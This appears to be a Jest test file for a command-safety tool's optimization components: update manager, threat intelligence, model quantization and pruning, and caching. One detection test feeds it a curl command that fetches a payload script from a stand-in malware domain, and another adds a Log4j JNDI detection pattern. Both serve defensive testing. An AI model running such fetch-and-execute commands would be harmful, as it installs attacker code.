import { UpdateManager } from '../../../src/optimization/update-manager';
import { ThreatIntelligence } from '../../../src/optimization/threat-intelligence';
import { PerformanceOptimizer } from '../../../src/optimization/performance-optimizer';
import { ModelOptimizer } from '../../../src/optimization/model-optimizer';
import { CacheManager } from '../../../src/optimization/cache-manager';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import * as crypto from 'crypto';

/**
 * Tests for Phase 3 Optimization Systems
 * 
 * Verifies update management, threat intelligence, and performance optimization
 */

describe('Phase 3 Optimization Tests', () => {
  let updateManager: UpdateManager;
  let threatIntel: ThreatIntelligence;
  let perfOptimizer: PerformanceOptimizer;
  let modelOptimizer: ModelOptimizer;
  let cacheManager: CacheManager;
  let tempDir: string;

  beforeAll(() => {
    // Create temp directory
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'deliberate-optimization-test-'));
  });

  afterAll(() => {
    // Cleanup
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  beforeEach(() => {
    // Initialize components
    updateManager = new UpdateManager({ updateDir: tempDir });
    threatIntel = ThreatIntelligence.getInstance();
    perfOptimizer = new PerformanceOptimizer();
    modelOptimizer = new ModelOptimizer();
    cacheManager = CacheManager.getInstance();
    
    // Clear caches
    cacheManager.clear();
  });

  describe('Update Manager', () => {
    test('should check for available updates', async () => {
      const updates = await updateManager.checkForUpdates();
      
      expect(updates).toBeDefined();
      expect(updates.available).toBeDefined();
      if (updates.available) {
        expect(updates.version).toBeDefined();
        expect(updates.releaseNotes).toBeDefined();
        expect(updates.securityFixes).toBeDefined();
      }
    });

    test('should download and verify updates', async () => {
      // Mock update package
      const mockUpdate = {
        version: '1.2.0',
        url: 'https://example.com/update.tar.gz',
        checksum: 'sha256:abcd1234',
        signature: 'valid-signature'
      };

      // Mock download
      jest.spyOn(updateManager as any, 'downloadFile').mockResolvedValue(
        path.join(tempDir, 'update.tar.gz')
      );
      
      jest.spyOn(updateManager as any, 'verifyChecksum').mockResolvedValue(true);
      jest.spyOn(updateManager as any, 'verifySignature').mockResolvedValue(true);

      const result = await updateManager.downloadUpdate(mockUpdate);
      
      expect(result.success).toBe(true);
      expect(result.path).toBeDefined();
      expect(result.verified).toBe(true);
    });

    test('should apply updates safely', async () => {
      const updatePath = path.join(tempDir, 'update.tar.gz');
      
      // Create mock update file
      fs.writeFileSync(updatePath, 'mock update data');
      
      // Mock backup creation
      jest.spyOn(updateManager as any, 'createBackup').mockResolvedValue({
        success: true,
        path: path.join(tempDir, 'backup')
      });

      const result = await updateManager.applyUpdate(updatePath);
      
      expect(result.success).toBe(true);
      expect(result.backedUp).toBe(true);
      expect(result.version).toBeDefined();
    });

    test('should rollback failed updates', async () => {
      const backupPath = path.join(tempDir, 'backup');
      fs.mkdirSync(backupPath);
      fs.writeFileSync(path.join(backupPath, 'test.txt'), 'backup data');

      const result = await updateManager.rollback(backupPath);
      
      expect(result.success).toBe(true);
      expect(result.restoredFrom).toBe(backupPath);
    });

    test('should auto-update threat patterns', async () => {
      const patterns = [
        {
          id: 'CVE-2024-1234',
          pattern: 'log4j.*\\$\\{jndi:',
          severity: 'critical',
          description: 'Log4j RCE vulnerability'
        }
      ];

      const result = await updateManager.updateThreatPatterns(patterns);
      
      expect(result.success).toBe(true);
      expect(result.patternsUpdated).toBe(1);
    });
  });

  describe('Threat Intelligence', () => {
    test('should fetch threat feeds', async () => {
      // Mock threat feed response
      jest.spyOn(threatIntel as any, 'fetchFeed').mockResolvedValue([
        {
          indicator: 'malicious.com',
          type: 'domain',
          severity: 'high',
          lastSeen: new Date().toISOString()
        },
        {
          indicator: '192.168.1.100',
          type: 'ip',
          severity: 'medium',
          lastSeen: new Date().toISOString()
        }
      ]);

      const threats = await threatIntel.updateThreatFeeds();
      
      expect(threats).toHaveLength(2);
      expect(threats[0].type).toBe('domain');
      expect(threats[1].type).toBe('ip');
    });

    test('should detect known threats in commands', async () => {
      // Add threat indicators
      await threatIntel.addIndicator({
        indicator: 'evil.malware.com',
        type: 'domain',
        severity: 'critical',
        metadata: { malwareFamily: 'ransomware' }
      });

      const result = await threatIntel.analyzeCommand(
        'curl',
        ['https://evil.malware.com/payload.sh']
      );
      
      expect(result.threatsDetected).toBe(true);
      expect(result.threats).toHaveLength(1);
      expect(result.threats[0].severity).toBe('critical');
      expect(result.recommendation).toBe('BLOCK');
    });

    test('should correlate threat patterns', async () => {
      // Add related indicators
      await threatIntel.addIndicator({
        indicator: 'bad-domain.com',
        type: 'domain',
        severity: 'high'
      });
      
      await threatIntel.addIndicator({
        indicator: '10.0.0.1',
        type: 'ip',
        severity: 'high',
        metadata: { associatedDomain: 'bad-domain.com' }
      });

      const correlation = await threatIntel.correlateThreats('10.0.0.1');
      
      expect(correlation.related).toHaveLength(1);
      expect(correlation.related[0].indicator).toBe('bad-domain.com');
      expect(correlation.riskScore).toBeGreaterThan(0.5);
    });

    test('should age out old threat data', async () => {
      // Add old threat
      const oldThreat = {
        indicator: 'old-threat.com',
        type: 'domain' as const,
        severity: 'low' as const,
        lastSeen: new Date(Date.now() - 90 * 24 * 60 * 60 * 1000).toISOString() // 90 days old
      };
      
      await threatIntel.addIndicator(oldThreat);
      
      // Add recent threat
      await threatIntel.addIndicator({
        indicator: 'new-threat.com',
        type: 'domain',
        severity: 'high'
      });

      // Cleanup old threats
      await threatIntel.cleanup(30); // 30 day retention
      
      const threats = await threatIntel.getAllIndicators();
      expect(threats.some(t => t.indicator === 'old-threat.com')).toBe(false);
      expect(threats.some(t => t.indicator === 'new-threat.com')).toBe(true);
    });

    test('should generate threat reports', async () => {
      // Add various threats
      for (let i = 0; i < 10; i++) {
        await threatIntel.addIndicator({
          indicator: `threat${i}.com`,
          type: 'domain',
          severity: i < 3 ? 'critical' : i < 7 ? 'high' : 'medium'
        });
      }

      const report = await threatIntel.generateReport();
      
      expect(report.summary.total).toBe(10);
      expect(report.summary.critical).toBe(3);
      expect(report.summary.high).toBe(4);
      expect(report.summary.medium).toBe(3);
      expect(report.topThreats).toBeDefined();
      expect(report.trends).toBeDefined();
    });
  });

  describe('Performance Optimization', () => {
    test('should optimize model for inference', async () => {
      // Mock model
      const mockModel = {
        layers: 10,
        parameters: 1000000,
        size: 4 * 1000000 // 4MB (float32)
      };

      const optimized = await modelOptimizer.optimize(mockModel, {
        quantization: true,
        pruning: true,
        distillation: false
      });
      
      expect(optimized.size).toBeLessThan(mockModel.size);
      expect(optimized.inferenceTime).toBeLessThan(100); // ms
      expect(optimized.accuracy).toBeGreaterThan(0.9); // 90% of original
    });

    test('should apply quantization to reduce model size', async () => {
      const weights = new Float32Array(1000).fill(0.5);
      
      const quantized = modelOptimizer.quantize(weights, {
        bits: 8,
        symmetric: true
      });
      
      // Should be roughly 1/4 the size (8-bit vs 32-bit)
      expect(quantized.data.byteLength).toBeLessThanOrEqual(weights.byteLength / 3);
      expect(quantized.scale).toBeDefined();
      expect(quantized.zeroPoint).toBeDefined();
    });

    test('should prune low-importance weights', async () => {
      // Create weights with varying importance
      const weights = new Float32Array(1000);
      for (let i = 0; i < weights.length; i++) {
        weights[i] = Math.random() * 0.1; // Small values
      }
      // Add some important weights
      for (let i = 0; i < 100; i++) {
        weights[i * 10] = Math.random() * 0.9 + 0.1; // Larger values
      }

      const pruned = modelOptimizer.prune(weights, {
        sparsity: 0.5 // Remove 50% of weights
      });
      
      const nonZero = pruned.filter(w => w !== 0).length;
      expect(nonZero).toBeCloseTo(500, -2); // Approximately 50% remaining
      
      // Important weights should be kept
      const importantKept = Array.from({ length: 100 }, (_, i) => i * 10)
        .filter(i => pruned[i] !== 0).length;
      expect(importantKept).toBeGreaterThan(80); // Most important weights kept
    });

    test('should optimize command routing performance', async () => {
      // Warm up cache with common patterns
      const commonCommands = [
        { cmd: 'ls', pattern: '^ls( -[la]+)?$' },
        { cmd: 'git', pattern: '^git (status|add|commit|push|pull)' },
        { cmd: 'docker', pattern: '^docker (run|ps|images|stop)' }
      ];

      const results = await perfOptimizer.optimizeRouting(commonCommands);
      
      expect(results.cacheHitRate).toBeGreaterThan(0.8);
      expect(results.avgRoutingTime).toBeLessThan(1); // ms
      expect(results.optimizedPatterns).toBeDefined();
    });

    test('should batch operations for efficiency', async () => {
      const operations = Array(100).fill(null).map((_, i) => ({
        id: `op${i}`,
        type: 'classify',
        data: { command: 'test', args: [`arg${i}`] }
      }));

      const start = Date.now();
      const results = await perfOptimizer.batchProcess(operations, {
        batchSize: 10,
        parallel: true
      });
      const duration = Date.now() - start;
      
      expect(results).toHaveLength(100);
      expect(results.every(r => r.processed)).toBe(true);
      
      // Should be faster than sequential processing
      const expectedSequentialTime = 100 * 10; // 10ms per operation
      expect(duration).toBeLessThan(expectedSequentialTime / 2);
    });
  });

  describe('Cache Optimization', () => {
    test('should implement LRU cache with size limits', () => {
      const cache = cacheManager.createCache('test', {
        maxSize: 3,
        ttl: 60000
      });

      // Fill cache
      cache.set('key1', 'value1');
      cache.set('key2', 'value2');
      cache.set('key3', 'value3');
      
      // Access key1 to make it recently used
      cache.get('key1');
      
      // Add new item, should evict key2 (least recently used)
      cache.set('key4', 'value4');
      
      expect(cache.get('key1')).toBe('value1');
      expect(cache.get('key2')).toBeUndefined();
      expect(cache.get('key3')).toBe('value3');
      expect(cache.get('key4')).toBe('value4');
    });

    test('should implement TTL expiration', async () => {
      const cache = cacheManager.createCache('ttl-test', {
        maxSize: 100,
        ttl: 100 // 100ms
      });

      cache.set('expires', 'value');
      expect(cache.get('expires')).toBe('value');
      
      // Wait for expiration
      await new Promise(resolve => setTimeout(resolve, 150));
      
      expect(cache.get('expires')).toBeUndefined();
    });

    test('should provide cache statistics', () => {
      const cache = cacheManager.createCache('stats-test', {
        maxSize: 10
      });

      // Generate some activity
      for (let i = 0; i < 20; i++) {
        cache.set(`key${i}`, `value${i}`);
      }
      
      // Access some keys
      for (let i = 0; i < 10; i++) {
        cache.get(`key${i * 2}`);
      }

      const stats = cache.getStats();
      
      expect(stats.size).toBe(10); // Max size
      expect(stats.hits).toBeGreaterThan(0);
      expect(stats.misses).toBeGreaterThan(0);
      expect(stats.hitRate).toBeDefined();
      expect(stats.evictions).toBeGreaterThan(0);
    });

    test('should optimize memory usage with compression', () => {
      const cache = cacheManager.createCache('compressed', {
        maxSize: 100,
        compression: true
      });

      // Store large repetitive data
      const largeData = 'x'.repeat(10000);
      cache.set('large', largeData);
      
      const stats = cache.getStats();
      expect(stats.memoryUsage).toBeLessThan(10000); // Should be compressed
      
      // Verify data integrity
      expect(cache.get('large')).toBe(largeData);
    });
  });

  describe('System-wide Optimization', () => {
    test('should profile and identify bottlenecks', async () => {
      const profiler = perfOptimizer.createProfiler();
      
      profiler.start();
      
      // Simulate various operations
      for (let i = 0; i < 100; i++) {
        profiler.mark('classify-start');
        await new Promise(resolve => setTimeout(resolve, Math.random() * 10));
        profiler.mark('classify-end');
        profiler.measure('classification', 'classify-start', 'classify-end');
      }
      
      const report = profiler.generateReport();
      
      expect(report.measurements['classification']).toBeDefined();
      expect(report.measurements['classification'].count).toBe(100);
      expect(report.measurements['classification'].avg).toBeDefined();
      expect(report.measurements['classification'].p95).toBeDefined();
      expect(report.bottlenecks).toBeDefined();
    });

    test('should auto-tune parameters based on workload', async () => {
      const workloadStats = {
        commandsPerSecond: 100,
        avgCommandLength: 50,
        dangerousCommandRatio: 0.1,
        aiAnalysisRatio: 0.3
      };

      const tuning = await perfOptimizer.autoTune(workloadStats);
      
      expect(tuning.cacheSize).toBeGreaterThan(1000); // Large cache for high throughput
      expect(tuning.batchSize).toBeDefined();
      expect(tuning.parallelism).toBeGreaterThan(1);
      expect(tuning.aiTimeout).toBeDefined();
    });

    test('should implement adaptive optimization', async () => {
      const optimizer = perfOptimizer.createAdaptiveOptimizer();
      
      // Simulate changing workload
      for (let hour = 0; hour < 24; hour++) {
        const load = hour >= 9 && hour <= 17 ? 'high' : 'low';
        const commandRate = load === 'high' ? 1000 : 100;
        
        await optimizer.adapt({
          timestamp: Date.now() + hour * 3600000,
          commandRate,
          cpuUsage: load === 'high' ? 0.7 : 0.2,
          memoryUsage: load === 'high' ? 0.8 : 0.3
        });
      }
      
      const schedule = optimizer.getOptimizationSchedule();
      
      expect(schedule.businessHours).toBeDefined();
      expect(schedule.businessHours.cacheSize).toBeGreaterThan(
        schedule.offHours.cacheSize
      );
    });
  });

  describe('Update Security', () => {
    test('should verify update signatures', async () => {
      const update = {
        version: '1.2.0',
        data: 'update content',
        signature: 'invalid-signature',
        publicKey: 'deliberate-public-key'
      };

      const isValid = await updateManager.verifyUpdateSignature(update);
      expect(isValid).toBe(false);
    });

    test('should validate update checksums', async () => {
      const content = 'update package content';
      const correctHash = crypto.createHash('sha256').update(content).digest('hex');
      const incorrectHash = 'incorrect-hash';

      expect(updateManager.validateChecksum(content, correctHash)).toBe(true);
      expect(updateManager.validateChecksum(content, incorrectHash)).toBe(false);
    });

    test('should sandbox update installation', async () => {
      const sandboxPath = path.join(tempDir, 'sandbox');
      
      const sandbox = await updateManager.createSandbox(sandboxPath);
      
      expect(sandbox.path).toBe(sandboxPath);
      expect(sandbox.isolated).toBe(true);
      expect(fs.existsSync(sandboxPath)).toBe(true);
      
      // Cleanup
      await updateManager.destroySandbox(sandbox);
      expect(fs.existsSync(sandboxPath)).toBe(false);
    });
  });
});
